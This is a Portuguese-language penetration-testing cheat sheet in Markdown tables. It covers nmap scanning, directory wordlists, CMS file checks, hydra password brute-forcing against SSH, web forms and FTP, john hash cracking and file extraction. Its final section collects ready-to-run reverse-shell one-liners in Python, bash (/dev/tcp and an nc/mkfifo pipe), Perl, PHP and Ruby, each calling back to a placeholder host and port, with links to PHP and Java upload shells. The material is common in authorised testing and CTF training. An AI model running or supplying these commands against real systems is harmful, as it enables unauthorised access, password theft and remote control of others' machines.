# _**ENUMERAÇÃO → REDES**_

| TIPO | COMANDO |
| -----| ------- |
| firewall | nmap -p [port_range] -A -T[1-5] [ip_address] |
| no firewall | nmap -p [port_range] -Pn -A -T[1-5] [ip_address] | 
| all ports | nmap -p- -A -T[1-5] [ip_address] | 

# _**ENUMERAÇÃO → DIRETÓRIOS**_

| | COMANDO |
| ---------- | ------- |
| DIRETÓRIOS | ../seclists/Discovery/Web-Content/common.txt |
| | ..seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt |
| | ..seclists/Discovery/Web-Content/Logins.fuzz.txt |

# _**ENUMERAÇÃO → CMS**_
| MANUALMENTE |
| ----------- |
| /readme.html |
| /changelog.txt |
| /docs/changelog.html |

# _**BRUTE FORCE → SENHAS**_
> ```bash
> hydra -l [username] -P [wordlist] -t [1-5] [extensão]
> ```
| TIPO | EXTENSÃO |
| ---- | -------- |
| SSH  | ssh://[ip_address] |
| WEB  | [ip_address] http-post-form "[login_page]:user=^USER^&pass=^PASS^:Username or password invalid" |
| FTP  | ftp://[ip_address] |

# _**BRUTE FORCE → EXTRAÇÃO DE HASHES**_
> ```bash
> john -w=/path/to/wordlist [file_name]
> ```
| TIPO | EXTENSÃO |
| ---- | -------- |
| zip  | zip2john [file.zip] > [file_name] |
| ssh  | ssh2jon [file] > [file_name.hash] |

# _**EXTRAÇÃO DE ARQUIVOS**_
| COM | COMANDO |
| --- | ------- |
| SSH | scp [username]@[ip_address]:/path/to/file /local/path |
| FTP | get [file_name] |
| WGET | wget ftp://[usuário]:[senha]@[ip_address]/[path/to/file] | 
| Binwalk | binwalk -e [file_name] |
| Steghide | steghide extract -sf [file_name][.jpg] |
| Hexeditor | hexeditor [file_name] |
| Strings | strings [file_name] |

# _**SHELLS & REVERSE SHELLS**_
> ```bash
> netcat (nc) -lvnp [port]
> ```
| TIPO | EM | COMANDO |
| ---- | -- | ------- |
| reverse shell | python | python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("[ip_address]",[port]));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);' |
| bash shell | python | python3 -c 'import pty, os; pty.spawn("/bin/bash")' |
| reverse shell | bash | bash -i >& /dev/tcp/[ip_address]/[port] 0>&1 |
| reverse shell | bash | rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc [ip_address] [port] >/tmp/f |
| reverse shell | perl | perl -e 'use Socket;$i="[ip_address]";$p=[port];socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};' |
| reverse shell | php | php -r '$sock=fsockopen("[ip_address]",[port]);exec("/bin/sh -i <&3 >&3 2>&3");' |
| reverse shell | php | [código disponível para download → pentest_monkey](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php) |
| reverse shell | ruby | ruby -rsocket -e'f=TCPSocket.open("[ip_address]",[port]).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)' |
| reverse shell | java | [com este código, em upload web, pode-se obter reverse shell](https://github.com/V0idA2tronaut/Programming/tree/main/Scripts/Shell%20scripts/SHELL%20JAVA) |
